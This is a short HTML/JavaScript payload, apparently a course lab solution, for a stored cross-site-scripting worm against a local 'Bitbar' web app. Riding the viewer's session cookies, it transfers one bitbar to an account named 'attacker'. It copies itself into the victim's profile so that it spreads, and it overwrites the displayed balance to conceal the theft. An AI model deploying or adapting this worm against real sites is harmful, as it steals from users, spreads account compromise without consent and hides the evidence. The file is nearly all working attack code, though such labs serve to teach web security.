<span id="bitbar_count" class="10"/>
<script>
    // PART 1: steal one bitbar
	var xhr1 = new XMLHttpRequest();
	xhr1.open('POST', 'http://localhost:3000/post_transfer');

	xhr1.withCredentials = true;
	xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	var args1 = 'destination_username=attacker&quantity=1';

	// PART 2: change their profile

	// step 1: find text content of the profile we're currently viewing in DOM
	// the form in profile/view.ejs
	let viewingProfile = document.getElementById('profile').innerHTML;

	xhr1.onload = function() {
		// step 2: send second post request
		// JS equivalent of hitting the "Update profile" button
		var xhr2 = new XMLHttpRequest();
		xhr2.open('POST', 'http://localhost:3000/set_profile');
		xhr2.withCredentials = true;

		// urlencoded is just a type of encoding, doesn't mean it's stored in url
		xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

		var reqBody = 'new_profile=' + encodeURIComponent(viewingProfile);

		xhr2.onload = function() {
			let elem = document.getElementById("bitbar_display");
			elem.innerHTML = "10 bitbars";
		}

		xhr2.send(reqBody);
	}

	xhr1.send(args1);
</script>
